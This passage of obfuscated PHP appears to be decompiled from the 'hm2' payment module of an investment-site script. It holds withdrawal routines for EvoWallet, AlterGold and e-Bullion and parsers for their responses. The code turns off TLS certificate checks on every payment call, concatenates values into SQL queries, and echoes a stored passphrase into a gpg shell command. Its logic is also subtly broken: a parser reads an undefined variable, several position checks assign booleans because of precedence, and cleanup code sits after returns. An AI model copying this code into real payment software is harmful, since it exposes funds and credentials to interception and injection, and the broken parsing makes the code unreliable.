        return array (1, '', $elnlcaMIz[$elnlcsyENS['elnlcwuPu']]);
      }
      else
      {
        if ($elnlcaMIz[$elnlcsyENS['elnlccotiB']] == $elnlcsyENS['elnlcaoJE'])
        {
          $e = elnlcnczen ('' . $elnlcRWgpq . ' ' . $elnlcaMIz[$elnlcsyENS['elnlcoJJM']]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = elnlcnczen ('' . $elnlcRWgpq . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = elnlcnczen ('' . $elnlcRWgpq . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcRWgpq . ' Curl functions are not available');
    }

  }

  function elnlcnxqmh ($elnlcpdllV)
  {
    global $elnlcsyENS;
    $elnlcaMIz = array ();
    $elnlcJfxs = elnlctaiie ($elnlcpdllV, 'response');
    if ($elnlcJfxs != '')
    {
      $elnlckbFm = $elnlcJfxs;
      $elnlcaMIz[$elnlcsyENS['elnlccotiB']] = elnlctaiie ($elnlckbFm, 'status');
      $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = elnlctaiie ($elnlcjcEao, 'statusmsg');
      $elnlcaMIz[$elnlcsyENS['elnlcwuPu']] = elnlctaiie ($elnlckbFm, 'batch');
      $elnlcaMIz[$elnlcsyENS['elnlcIbss']] = elnlctaiie ($elnlckbFm, 'fromaccount');
      $elnlcaMIz[$elnlcsyENS['elnlcANlw']] = elnlctaiie ($elnlckbFm, 'toaccount');
      $elnlcaMIz[$elnlcsyENS['elnlcyteO']] = elnlctaiie ($elnlckbFm, 'amount');
      $elnlcaMIz[$elnlcsyENS['elnlccefl']] = elnlctaiie ($elnlckbFm, 'currency');
      $elnlcaMIz[$elnlcsyENS['elnlcSpaN']] = elnlctaiie ($elnlckbFm, 'checksum');
      if ($elnlcaMIz[$elnlcsyENS['elnlccotiB']] == 0)
      {
        $elnlcaMIz[$elnlcsyENS['elnlccotiB']] = $elnlcsyENS['elnlcfNibu'];
      }
    }

    if (0 < $elnlcaMIz[$elnlcsyENS['elnlccotiB']])
    {
      switch ($elnlcaMIz[$elnlcsyENS['elnlccotiB']])
      {
        case 10310:
        {
          $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = '10310: Invalid Account Prefix';
          break;
        }

        case 10311:
        {
          $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = '10311: Payer account has been suspended';
          break;
        }

        case 10312:
        {
          $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = '10312: API transfer disabled';
          break;
        }

        case 10313:
        {
          $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = '10313: Payee account not found';
          break;
        }

        case 10314:
        {
          $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = '10314: Payer spending over daily limit';
          break;
        }

        case 10315:
        {
          $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = '10315: Payee account has been suspended';
          break;
        }

        case 10316:
        {
          $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = '10316: Payee account has been limited';
          break;
        }

        case 10317:
        {
          $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = '10317: Spending less than minimum allowed';
          break;
        }

        case 10318:
        {
          $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = '10318: Payee will reach their balance limit';
          break;
        }

        case 10319:
        {
          $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = '10319: Payer do not have enough funds';
          break;
        }

        case 10320:
        {
          $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = '10320: Payee has an invalid balance security check';
          break;
        }

        case 10321:
        {
          $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = '10321: Spend was not complete';
          break;
        }

        case 10322:
        {
          $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = '10322: Payee account group not found';
          break;
        }

        case 10323:
        {
          $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = '10323: Invalid payee account';
          break;
        }

        case 10324:
        {
          $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = '10324: Invalid IP range';
          break;
        }

        case 10325:
        {
          $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = '10325: Invalid API or not enabled';
          break;
        }

        case 10326:
        {
          $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = '10326: Payer account group not found';
          break;
        }

        case 10327:
        {
          $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = '10327: Invalid payer account';
          break;
        }

        case 10328:
        {
          $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = '10328: Invalid checksum';
          break;
        }

        case 10110:
        {
          $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = '10110: Invalid Account Prefix';
          break;
        }

        case 10111:
        {
          $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = '10111: Account has been suspended';
          break;
        }

        case 10112:
        {
          $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = '10112: Invalid API or API not enabled';
          break;
        }

        case 10113:
        {
          $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = '10113: API balance query disabled';
          break;
        }

        case 10114:
        {
          $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = '10114: IP not in the allowed range';
          break;
        }

        case 10115:
        {
          $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = '10115: Balance can not be retrieved';
          break;
        }

        case 10116:
        {
          $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = '10116: Reserve';
          break;
        }

        case 10117:
        {
          $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = '10117: Account group not found';
          break;
        }

        case 10118:
        {
          $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = '10118: This account can not be found';
          break;
        }

        case 10119:
        {
          $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = '10119: Invalid Checksum';
          break;
        }
      }

      $elnlcaMIz[$elnlcsyENS['elnlccotiB']] = $elnlcsyENS['elnlcHHvP'];
    }

    return $elnlcaMIz;
  }

  function elnlcewesn ($elnlcnOll, $elnlcrUqv, $elnlcOPfeJ, $elnlcgDnCo, $elnlcRWgpq, $elnlcAJLW = 'USD')
  {
    global $elnlcsyENS;
    global $elnlcSuVc;
    if ($elnlcSuVc[$elnlcsyENS['elnlcIEsb']] == $elnlcsyENS['elnlcjCSJ'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcSuVc[$elnlcsyENS['elnlciwSzJ']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcOPfeJ == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty EvoWallet account.\'';
      mysql_query ($q);
      return array (0, 'Invalid EvoWallet account', '');
    }

    list ($elnlcPIOsC, $elnlcLAPT) = elnlcvkpnr ($elnlcOPfeJ, 24);
    if ($elnlcPIOsC == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcLAPT . '\'';
      mysql_query ($q);
      return array (0, $elnlcLAPT);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcnOll == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'evowallet_password\'';
        $elnlchGkPU = mysql_query ($q);
        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
        {
          $elnlcRjoMN = elnlctiim ($elnlcCgqPK[$elnlcsyENS['elnlcOnrTm']], $elnlcsyENS['elnlcWfUti']);
        }

        $elnlcFTHzd = $elnlcSuVc[$elnlcsyENS['elnlcRcbc']];
      }
      else
      {
        list ($elnlcRjoMN, $elnlcFTHzd) = preg_split ('/\\|/', $elnlcnOll);
      }

      $elnlcEPBUz = curl_init ();
      $elnlcPFMpD = date ($elnlcsyENS['elnlcIpUx']);
      $elnlcLVVS = strtoupper (md5 ($elnlcFTHzd . $elnlcPFMpD . '103' . '' . $elnlcAJLW . $elnlcSuVc[$elnlcsyENS['elnlcsodeQ']] . $elnlcOPfeJ . $elnlcrUqv . md5 ($elnlcRjoMN)));
      $elnlcoFEhc = '<?xml version="1.0" encoding="utf-8"?>
<request>
<apiname>' . htmlentities ($elnlcFTHzd, ENT_NOQUOTES) . '</apiname>
<trandate>' . $elnlcPFMpD . '</trandate>
<trantype>103</trantype>
<tranid></tranid>
<curcode>' . $elnlcAJLW . '</curcode>
<fromaccount>' . htmlentities ($elnlcSuVc[$elnlcsyENS['elnlcsodeQ']], ENT_NOQUOTES) . '</fromaccount>
<toaccount>' . htmlentities ($elnlcOPfeJ, ENT_NOQUOTES) . '</toaccount>
<amount>' . htmlentities ($elnlcrUqv, ENT_NOQUOTES) . '</amount>
<memo>' . htmlentities ($elnlcgDnCo, ENT_NOQUOTES) . '</memo> 
<checksum>' . $elnlcLVVS . '</checksum> 
</request>';
      $elnlcEPBUz = curl_init ();
      curl_setopt ($elnlcEPBUz, CURLOPT_URL, 'https://www.evowallet.com/api.php?req=' . urlencode ($elnlcoFEhc));
      curl_setopt ($elnlcEPBUz, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcEPBUz, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcEPBUz);
      curl_close ($elnlcEPBUz);
      $elnlcaMIz = elnlcnxqmh ($a);
      if ($elnlcaMIz[$elnlcsyENS['elnlccotiB']] == $elnlcsyENS['elnlcvncu'])
      {
        return array (1, '', $elnlcaMIz[$elnlcsyENS['elnlcwuPu']]);
      }
      else
      {
        if ($elnlcaMIz[$elnlcsyENS['elnlccotiB']] == $elnlcsyENS['elnlcaoJE'])
        {
          $e = elnlcnczen ('' . $elnlcRWgpq . ' ' . $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] . '<br>' . $elnlcaMIz[$elnlcsyENS['elnlcJcklA']]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = elnlcnczen ('' . $elnlcRWgpq . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = elnlcnczen ('' . $elnlcRWgpq . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcRWgpq . ' Curl functions are not available');
    }

  }

  function elnlcelbi ($elnlcOLyC, $elnlcrUqv, $elnlcOPfeJ, $elnlcgDnCo, $elnlcRWgpq)
  {
    global $elnlcsyENS;
    global $elnlcSuVc;
    if ($elnlcSuVc[$elnlcsyENS['elnlcIEsb']] == $elnlcsyENS['elnlcjCSJ'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcSuVc[$elnlcsyENS['elnlciwSzJ']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcOPfeJ == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to AlterGold account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid AlterGold account', '');
    }

    list ($elnlcPIOsC, $elnlcLAPT) = elnlcvkpnr ($elnlcOPfeJ, 17);
    if ($elnlcPIOsC == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcLAPT . '\'';
      mysql_query ($q);
      return array (0, $elnlcLAPT);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcOLyC == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'altergold_password\'';
        $elnlchGkPU = mysql_query ($q);
        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
        {
          $elnlcsOHfB = elnlctiim ($elnlcCgqPK[$elnlcsyENS['elnlcOnrTm']], $elnlcsyENS['elnlcWfUti']);
        }
      }
      else
      {
        $elnlcsOHfB = $elnlcOLyC;
      }

      $elnlcEPBUz = curl_init ();
      $elnlcgDnCo = rawurlencode ($elnlcgDnCo);
      curl_setopt ($elnlcEPBUz, CURLOPT_URL, 'https://api.altergold.com/spend.php');
      curl_setopt ($elnlcEPBUz, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcEPBUz, CURLOPT_POST, 1);
      curl_setopt ($elnlcEPBUz, CURLOPT_POSTFIELDS, 'PAYER_ACCOUNT=' . rawurlencode ($elnlcSuVc[$elnlcsyENS['elnlcGFGW']]) . '&PAYER_PASSWORD=' . rawurlencode ($elnlcsOHfB) . '&PAYEE_ACCOUNT=' . rawurlencode ($elnlcOPfeJ) . '&PAYMENT_AMOUNT=' . rawurlencode ($elnlcrUqv) . ('' . '&PAYMENT_CURRENCY=USD&MEMO=' . $elnlcgDnCo));
      curl_setopt ($elnlcEPBUz, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcEPBUz);
      curl_close ($elnlcEPBUz);
      if ($a == '')
      {
        print 'Blank response from Altergold processor service.';
      }
      else
      {
        $elnlcjPews = array ('E10011' => 'Unable to Login as Payer. This means wrong login information was provided.', 'E10012' => 'Payer is not allowed to make outgoing spends. Means account is suspended or perhaps limited.', 'E10013' => 'API Automated Spends not Enabled.', 'E10014' => 'Unable to authorize IP address.', 'E10015' => 'Recipient account not found', 'E10016' => 'Recipient account is suspended.', 'E10017' => 'Invalid spend units.', 'E10018' => 'Spend amount is too low.', 'E10019' => 'Recipient reached balance limit.', 'E10020' => 'Not enough funds.', 'E10021' => '* Please contact support.');
        if ($elnlcjPews[$a] != '')
        {
          $e = elnlcnczen ('' . $elnlcRWgpq . ' ' . $elnlcjPews[$a]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcRWgpq . ('' . ' ' . $elnlcjPews[$a]), '');
        }
        else
        {
          return array (1, '', $a);
        }
      }
    }
    else
    {
      $e = elnlcnczen ('' . $elnlcRWgpq . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcRWgpq . ' Curl functions are not available');
    }

  }

  function elnlcqwlb ($elnlcFfwc, $elnlcrUqv, $elnlcOPfeJ, $elnlcgDnCo, $elnlcRWgpq, $elnlciSebT)
  {
    global $elnlcsyENS;
    global $elnlcSuVc;
    if ($elnlcSuVc[$elnlcsyENS['elnlcIEsb']] == $elnlcsyENS['elnlcjCSJ'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcSuVc[$elnlcsyENS['elnlciwSzJ']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcOPfeJ == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to e-Bullion account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid e-Bullion account', '');
    }

    list ($elnlcPIOsC, $elnlcLAPT) = elnlcvkpnr ($elnlcOPfeJ, 5);
    if ($elnlcPIOsC == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcLAPT . '\'';
      mysql_query ($q);
      return array (0, $elnlcLAPT);
    }

    if (function_exists ('curl_init'))
    {
      $elnlcxGvl = '<atip.batch.v1><payment.list>';
      $elnlcxGvl = $elnlcxGvl . '<payment>';
      $elnlcxGvl = $elnlcxGvl . '<payer>' . htmlentities ($elnlcSuVc[$elnlcsyENS['elnlcEmKp']], ENT_NOQUOTES) . '</payer>';
      $elnlcxGvl = $elnlcxGvl . '<payee>' . htmlentities ($elnlcOPfeJ, ENT_NOQUOTES) . '</payee>';
      $elnlcxGvl = $elnlcxGvl . '<amount>' . htmlentities ($elnlcrUqv, ENT_NOQUOTES) . '</amount>';
      $elnlcxGvl = $elnlcxGvl . '<metal>' . ($elnlciSebT == 5 ? 1 : 3) . '</metal>';
      $elnlcxGvl = $elnlcxGvl . '<unit>1</unit>';
      $elnlcxGvl = $elnlcxGvl . '<memo>' . htmlentities ($elnlcgDnCo, ENT_NOQUOTES) . '</memo>';
      $elnlcxGvl = $elnlcxGvl . '<ref></ref>';
      $elnlcxGvl = $elnlcxGvl . '</payment>';
      $elnlcxGvl = $elnlcxGvl . '</payment.list></atip.batch.v1>';
      $elnlcFIao = tempnam ('./tmpl_c/', 'in.');
      $elnlcmOdz = tempnam ('./tmpl_c/', 'out.');
      $elnlcITMy = fopen ($elnlcFIao, $elnlcsyENS['elnlcFobeq']);
      fwrite ($elnlcITMy, $elnlcxGvl);
      fclose ($elnlcITMy);
      $elnlcLfHMM = './tmpl_c/';
      $elnlckwcx = escapeshellcmd ($elnlcSuVc[$elnlcsyENS['elnlcfsTJ']]);
      $elnlcnLdrc = elnlctiim ($elnlcSuVc[$elnlcsyENS['elnlcsnee']], $elnlcsyENS['elnlcWfUti']);
      $elnlcpkpR = $elnlcSuVc[$elnlcsyENS['elnlcRQss']];
      $elnlcIKUK = '' . ' --yes --no-tty --no-secmem-warning --no-options --no-default-keyring --batch --homedir ' . $elnlcLfHMM . ' --keyring=pubring.gpg --secret-keyring=secring.gpg --armor --throw-keyid --always-trust --passphrase-fd 0';
      $elnlcaSjb = '' . 'echo \'' . $elnlcnLdrc . '\' | ' . $elnlckwcx . ' ' . $elnlcIKUK . ' --recipient A20077\\@e-bullion.com --local-user ' . $elnlcSuVc[$elnlcsyENS['elnlcEmKp']] . ('' . '\\@e-bullion.com --output ' . $elnlcmOdz . ' --sign --encrypt ' . $elnlcFIao . ' 2>&1');
      $elnlccktRA = '';
      $elnlcKvqEM = popen ('' . $elnlcaSjb, 'r');
      while (!feof ($elnlcKvqEM))
      {
        $elnlccktRA = fgets ($elnlcKvqEM, 4096);
      }

      pclose ($elnlcKvqEM);
      $elnlcITMy = fopen ($elnlcmOdz, $elnlcsyENS['elnlcJovb']);
      $elnlcwwek = fread ($elnlcITMy, filesize ($elnlcmOdz));
      fclose ($elnlcITMy);
      unlink ($elnlcFIao);
      unlink ($elnlcmOdz);
      $elnlcGcuCw = 'ATIP_ACCOUNT=' . rawurlencode ($elnlcSuVc[$elnlcsyENS['elnlcEmKp']]) . '&ATIP_BATCH_MSG=' . rawurlencode ($elnlcwwek) . '&ATIP_STATUS_URL=' . rawurlencode ($elnlcpkpR);
      $elnlcEPBUz = curl_init ();
      curl_setopt ($elnlcEPBUz, CURLOPT_URL, '' . 'https://atip.e-bullion.com/batch.php?' . $elnlcGcuCw);
      curl_setopt ($elnlcEPBUz, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcEPBUz, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt ($elnlcEPBUz, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)');
      curl_setopt ($elnlcEPBUz, CURLOPT_HEADER, 1);
      $a = curl_exec ($elnlcEPBUz);
      curl_close ($elnlcEPBUz);
      $elnlcvWfG = array ();
      $elnlcQTiU = '';
      if (preg_match ('/Location: .*?\\?ATIP_VERIFICATION=([^\\r\\n]+)%0A/', $a, $elnlcvWfG))
      {
        $elnlcQTiU = $elnlcvWfG[1];
      }

      $elnlcQTiU = urldecode ($elnlcQTiU);
      $elnlckBGBT = tempnam ('./tmpl_c/', 'xml.cert.');
      $elnlcxzBh = tempnam ('./tmpl_c/', 'xml.tmp.');
      $elnlcITMy = fopen ('' . $elnlcxzBh, $elnlcsyENS['elnlcFobeq']);
      fwrite ($elnlcITMy, $elnlcQTiU);
      fclose ($elnlcITMy);
      $elnlcIKUK = '' . ' --yes --no-tty --no-secmem-warning --no-options --no-default-keyring --batch --homedir ' . $elnlcLfHMM . ' --keyring=pubring.gpg --secret-keyring=secring.gpg --armor --passphrase-fd 0';
      $elnlcaSjb = '' . 'echo \'' . $elnlcnLdrc . '\' | ' . $elnlckwcx . ' ' . $elnlcIKUK . ' --output ' . $elnlckBGBT . ' --decrypt ' . $elnlcxzBh . ' 2>&1';
      $elnlccktRA = '';
      $elnlcmSgp = '';
      $elnlcKvqEM = popen ('' . $elnlcaSjb, 'r');
      while (!feof ($elnlcKvqEM))
      {
        $elnlccktRA = fgets ($elnlcKvqEM, 4096);
        $elnlcIuwgp = strstr ($elnlccktRA, 'key ID');
        if (0 < strlen ($elnlcIuwgp))
        {
          $elnlcmSgp = preg_replace ('/[\\n\\r]/', '', substr ($elnlcIuwgp, 7));
          continue;
        }
      }

      pclose ($elnlcKvqEM);
      if ($elnlcmSgp == $elnlcSuVc[$elnlcsyENS['elnlcbqbpQ']])
      {
        if (is_file ('' . $elnlckBGBT))
        {
          $elnlcVdNOB = fopen ('' . $elnlckBGBT, $elnlcsyENS['elnlcJovb']);
          $elnlcpdllV = fread ($elnlcVdNOB, filesize ('' . $elnlckBGBT));
          fclose ($elnlcVdNOB);
        }
        else
        {
          $e = elnlcnczen ('' . $elnlcRWgpq . ' Can not found decrypted verification response!');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcRWgpq . ' Can not found decrypted verification response!', '');
        }

        $elnlcoFEhc = elnlcjuwd ($elnlcpdllV);
        if ($elnlcoFEhc[$elnlcsyENS['elnlccotiB']] == $elnlcsyENS['elnlcvncu'])
        {
          return array (1, '', $elnlcoFEhc[$elnlcsyENS['elnlcwuPu']]);
        }
        else
        {
          if ($elnlcoFEhc[$elnlcsyENS['elnlccotiB']] == $elnlcsyENS['elnlcaoJE'])
          {
            $e = elnlcnczen ('' . $elnlcRWgpq . ' ' . $elnlcoFEhc[$elnlcsyENS['elnlcoJJM']] . ' ' . $elnlcoFEhc[$elnlcsyENS['elnlcJcklA']]);
            $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
            mysql_query ($q);
            return array (0, $elnlcRWgpq . $elnlcoFEhc[$elnlcsyENS['elnlcoJJM']] . ' ' . $elnlcoFEhc[$elnlcsyENS['elnlcJcklA']]);
          }
          else
          {
            $e = elnlcnczen ('' . $elnlcRWgpq . ' Unknown error');
            $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
            mysql_query ($q);
            return array (0, $elnlcRWgpq . ' Unknown error', '');
          }
        }
      }
      else
      {
        $e = elnlcnczen ('' . $elnlcRWgpq . ' Can not decrypt verification response! ');
        $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
        mysql_query ($q);
        return array (0, $elnlcRWgpq . ' Can not decrypt verification response!', '');
      }

      unlink ($elnlcxzBh);
      unlink ($elnlckBGBT);
    }
    else
    {
      $e = elnlcnczen ('' . $elnlcRWgpq . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcRWgpq . ' Curl functions are not available', '');
    }

  }

  function elnlctaiie ($elnlcoFEhc, $elnlckrbA)
  {
    global $elnlcsyENS;
    $elnlckrbA = strtolower ($elnlckrbA);
    $elnlcdFlcU = strlen ($elnlckrbA) + 2;
    if ($elnlcfovQE = strpos ($elnlcoFEhc, '' . '<' . $elnlckrbA . '>') === false)
    {
      return '';
    }

    if ($elnlclucM = strpos ($elnlcoFEhc, '' . '</' . $elnlckrbA . '>') === false)
    {
      return '';
    }

    $elnlcrkADN = trim (substr ($elnlcoFEhc, $elnlcfovQE + $elnlcdFlcU, $elnlclucM - ($elnlcfovQE + $elnlcdFlcU)));
    return $elnlcrkADN;
  }

  function elnlcjuwd ($elnlcpdllV)
  {
    global $elnlcsyENS;
    $elnlcaMIz = array ();
    $elnlcPjBrl = elnlctaiie ($elnlcpdllV, 'balanceresponse.list');
    if ($elnlcPjBrl != '')
    {
      $elnlcaMIz[$elnlcsyENS['elnlccotiB']] = $elnlcsyENS['elnlcgRoj'];
      $elnlcmzBks = false;
      if ($elnlccAkg = stristr ($elnlcPjBrl, '<balance>') === false)
      {
        $elnlcmzBks = true;
      }
      else
      {
        $elnlcfovQE = strlen ($elnlcPjBrl) - strlen ($elnlccAkg);
      }

      if ($elnlcHVgA = stristr ($elnlcPjBrl, '</balance>') === false)
      {
        $elnlcmzBks = true;
      }
      else
      {
        $elnlclucM = strlen ($elnlcPjBrl) - strlen ($elnlcHVgA);
      }

      while (!$elnlcmzBks)
      {
        $elnlcsTEtr = trim (substr ($elnlcPjBrl, $elnlcfovQE + 9, $elnlclucM - 9));
        $elnlcPjBrl = trim (substr ($elnlcPjBrl, $elnlclucM + 10));
        $elnlcaMIz[$elnlcsyENS['elnlcyteO']] = elnlctaiie ($elnlcsTEtr, 'amount');
        if ($elnlccAkg = stristr ($elnlcPjBrl, '<balance>') === false)
        {
          $elnlcmzBks = true;
        }
        else
        {
          $elnlcfovQE = strlen ($elnlcPjBrl) - strlen ($elnlccAkg);
        }

        if ($elnlcHVgA = stristr ($elnlcPjBrl, '</balance>') === false)
        {
          $elnlcmzBks = true;
          continue;
        }
        else
        {
          $elnlclucM = strlen ($elnlcPjBrl) - strlen ($elnlcHVgA);
          continue;
        }
      }
    }

    $elnlcJfxs = elnlctaiie ($elnlcpdllV, 'verified.list');
    if ($elnlcJfxs != '')
    {
      $elnlcaMIz[$elnlcsyENS['elnlccotiB']] = $elnlcsyENS['elnlcfNibu'];
      $elnlcmzBks = false;
      if ($elnlccAkg = stristr ($elnlcJfxs, '<transaction>') === false)
      {
        $elnlcmzBks = true;
      }
      else
      {
        $elnlcfovQE = strlen ($elnlcJfxs) - strlen ($elnlccAkg);
      }

      if ($elnlcHVgA = stristr ($elnlcJfxs, '</transaction>') === false)
      {
        $elnlcmzBks = true;
      }
      else
      {
        $elnlclucM = strlen ($elnlcJfxs) - strlen ($elnlcHVgA);
      }

      while (!$elnlcmzBks)
      {
        $elnlckbFm = trim (substr ($elnlcJfxs, $elnlcfovQE + 13, $elnlclucM - 13));
        $elnlcJfxs = trim (substr ($elnlcJfxs, $elnlclucM + 14));
        $elnlcaMIz[$elnlcsyENS['elnlcwuPu']] = elnlctaiie ($elnlckbFm, 'id');
        $elnlcaMIz[$elnlcsyENS['elnlcANlw']] = elnlctaiie ($elnlckbFm, 'payee');
        $elnlcaMIz[$elnlcsyENS['elnlcIbss']] = elnlctaiie ($elnlckbFm, 'payer');
        $elnlcaMIz[$elnlcsyENS['elnlcyteO']] = elnlctaiie ($elnlckbFm, 'amount');
        $elnlcaMIz[$elnlcsyENS['elnlcIokC']] = elnlctaiie ($elnlckbFm, 'metal');
        $elnlcaMIz[$elnlcsyENS['elnlcEuKS']] = elnlctaiie ($elnlckbFm, 'unit');
        $elnlcaMIz[$elnlcsyENS['elnlcHSjgu']] = elnlctaiie ($elnlckbFm, 'memo');
        $elnlcaMIz[$elnlcsyENS['elnlcwWga']] = elnlctaiie ($elnlckbFm, 'exchange');
        $elnlcaMIz[$elnlcsyENS['elnlcQPPV']] = elnlctaiie ($elnlckbFm, 'fee');
        if ($elnlccAkg = stristr ($elnlcJfxs, '<transaction>') === false)
        {
          $elnlcmzBks = true;
        }
        else
        {
          $elnlcfovQE = strlen ($elnlcJfxs) - strlen ($elnlccAkg);
        }

        if ($elnlcHVgA = stristr ($elnlcJfxs, '</transaction>') === false)
        {
          $elnlcmzBks = true;
          continue;
        }
        else
        {
          $elnlclucM = strlen ($elnlcJfxs) - strlen ($elnlcHVgA);
          continue;
        }
      }
    }

    $elnlcnhJN = elnlctaiie ($elnlcpdllV, 'failed.list');
    if ($elnlcnhJN != '')
    {
      $elnlcaMIz[$elnlcsyENS['elnlccotiB']] = $elnlcsyENS['elnlcHHvP'];
      $elnlcmzBks = false;
      if ($elnlccAkg = stristr ($elnlcnhJN, '<failed>') === false)
      {
        $elnlcmzBks = true;
      }
      else
      {
        $elnlcfovQE = strlen ($elnlcnhJN) - strlen ($elnlccAkg);
      }

      if ($elnlcHVgA = stristr ($elnlcnhJN, '</failed>') === false)
      {
        $elnlcmzBks = true;
      }
      else
      {
        $elnlclucM = strlen ($elnlcnhJN) - strlen ($elnlcHVgA);
      }

      while (!$elnlcmzBks)
      {
        $elnlcHMlT = trim (substr ($elnlcnhJN, $elnlcfovQE + 13, $elnlclucM - 13));
        $elnlcnhJN = trim (substr ($elnlcnhJN, $elnlclucM + 14));
        $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = elnlctaiie ($elnlcHMlT, 'error');
        if ($elnlccAkg = stristr ($elnlcnhJN, '<failed>') === false)
        {
          $elnlcmzBks = true;
        }
        else
        {
          $elnlcfovQE = strlen ($elnlcnhJN) - strlen ($elnlccAkg);
        }

        if ($elnlcHVgA = stristr ($elnlcnhJN, '</failed>') === false)
        {
          $elnlcmzBks = true;
          continue;
        }
        else
        {
          $elnlclucM = strlen ($elnlcnhJN) - strlen ($elnlcHVgA);
          continue;
        }
      }
    }

    $elnlcsgNvx = elnlctaiie ($elnlcpdllV, 'errorresponse.list');
    if ($elnlcsgNvx != '')
    {
      $elnlcaMIz[$elnlcsyENS['elnlccotiB']] = $elnlcsyENS['elnlcHHvP'];
      $elnlcmzBks = false;
      if ($elnlccAkg = stristr ($elnlcsgNvx, '<errorresponse>') === false)
      {
        $elnlcmzBks = true;
      }
      else
      {
        $elnlcfovQE = strlen ($elnlcsgNvx) - strlen ($elnlccAkg);
      }

      if ($elnlcHVgA = stristr ($elnlcsgNvx, '</errorresponse>') === false)
      {
        $elnlcmzBks = true;
      }
      else
      {
        $elnlclucM = strlen ($elnlcsgNvx) - strlen ($elnlcHVgA);
      }
